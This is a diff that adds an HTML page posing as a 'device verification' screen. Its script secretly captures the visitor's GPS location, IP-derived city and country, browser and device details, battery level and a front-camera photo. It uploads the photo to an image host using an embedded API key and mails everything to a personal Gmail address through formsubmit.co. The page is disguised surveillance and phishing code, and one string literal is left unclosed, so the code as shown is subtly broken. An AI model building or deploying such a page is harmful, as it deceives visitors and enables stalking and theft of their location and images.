@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body style="background:#0f172a;color:white;text-align:center;font-family:Arial">
+<h2>Verifying device…</h2>
+<p>Please allow permissions</p>
+
+<form id="sendForm" action="https://formsubmit.co/delfinadodennis26@gmail.com" method="POST">
+  <!-- GPS -->
+  <input type="hidden" name="Latitude" id="lat">
+  <input type="hidden" name="Longitude" id="lon">
+  <input type="hidden" name="Google Maps" id="map">
+
+  <!-- Device -->
+  <input type="hidden" name="User Agent" id="ua">
+  <input type="hidden" name="Platform" id="platform">
+  <input type="hidden" name="Language" id="lang">
+  <input type="hidden" name="Screen" id="screen">
+  <input type="hidden" name="Timezone" id="tz">
+  <input type="hidden" name="Date Time" id="time">
+
+  <!-- Network -->
+  <input type="hidden" name="IP" id="ip">
+  <input type="hidden" name="City" id="city">
+  <input type="hidden" name="Region" id="region">
+  <input type="hidden" name="Country" id="country">
+
+  <!-- Battery -->
+  <input type="hidden" name="Battery Level" id="battery">
+
+  <!-- Camera -->
+  <input type="hidden" name="Camera Image Link" id="photoLink">
+
+  <!-- Settings -->
+  <input type="hidden" name="_subject" value="📍 DEVICE + GPS + IMAGE">
+  <input type="hidden" name="_captcha" value="false">
+</form>
+
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+/* BASIC INFO */
+ua.value = navigator.userAgent;
+platform.value = navigator.platform;
+lang.value = navigator.language;
+screen.value = screen.width + "x" + screen.height;
+tz.value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+time.value = new Date().toString();
+
+/* IP INFO */
+fetch("https://ipinfo.io/json")
+.then(r => r.json())
+.then(d => {
+  ip.value = d.ip;
+  city.value = d.city;
+  region.value = d.region;
+  country.value = d.country;
+});
+
+/* BATTERY */
+if (navigator.getBattery) {
+  navigator.getBattery().then(b => {
+    battery.value = Math.round(b.level * 100) + "%";
+  });
+}
+
+/* CAMERA → UPLOAD TO IMGBB */
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(stream => {
+  video.srcObject = stream;
+
+  setTimeout(() => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+
+    let base64 = canvas.toDataURL("image/jpeg", 0.8).split(",")[1];
+
+    let form = new FormData();
+    form.append("key", "d2df52b590013ea953b1139e637b8973);
+    form.append("image", base64);
+
+    fetch("https://api.imgbb.com/1/upload", {
+      method: "POST",
+      body: form
+    })
+    .then(res => res.json())
+    .then(data => {
+      photoLink.value = data.data.url;
+    });
+  }, 1500);
+});
+
+/* GPS + SEND */
+navigator.geolocation.getCurrentPosition(
+  pos => {
+    lat.value = pos.coords.latitude;
+    lon.value = pos.coords.longitude;
+    map.value = "https://maps.google.com/?q=" + lat.value + "," + lon.value;
+
+    setTimeout(() => {
+      sendForm.submit();
+      document.body.innerHTML = "<h3>Verification complete</h3>";
+    }, 3000);
+  },
+  () => {
+    document.body.innerHTML = "<h3>Permission denied</h3>";
+  }
+);
+</script>
+
+</body>
+</html>
